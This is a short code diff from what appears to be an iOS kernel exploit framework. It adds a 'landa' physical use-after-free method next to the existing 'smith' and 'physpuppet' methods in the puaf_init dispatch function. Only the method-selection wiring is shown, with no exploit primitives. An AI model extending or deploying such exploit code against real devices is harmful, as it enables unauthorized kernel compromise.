@@ -18,7 +18,7 @@ void puaf_init(struct kfd* kfd, uint64_t exploit_type)
         kfd->puaf.puaf_method_ops.cleanup = smith_cleanup;
         kfd->puaf.puaf_method_ops.free = smith_free;
     }
-    else
+    else if(exploit_type == MEOW_EXPLOIT_PHYSPUPPET)
     {
         const char* method_name = "physpuppet";
         print_string(method_name);
@@ -26,6 +26,15 @@ void puaf_init(struct kfd* kfd, uint64_t exploit_type)
         kfd->puaf.puaf_method_ops.run = physpuppet_run;
         kfd->puaf.puaf_method_ops.cleanup = physpuppet_cleanup;
         kfd->puaf.puaf_method_ops.free = physpuppet_free;
+    }
+    else
+    {
+        const char* method_name = "landa";
+        print_string(method_name);
+        kfd->puaf.puaf_method_ops.init = landa_init;
+        kfd->puaf.puaf_method_ops.run = landa_run;
+        kfd->puaf.puaf_method_ops.cleanup = landa_cleanup;
+        kfd->puaf.puaf_method_ops.free = landa_free;
     }
 
     kfd->puaf.puaf_method_ops.init(kfd);
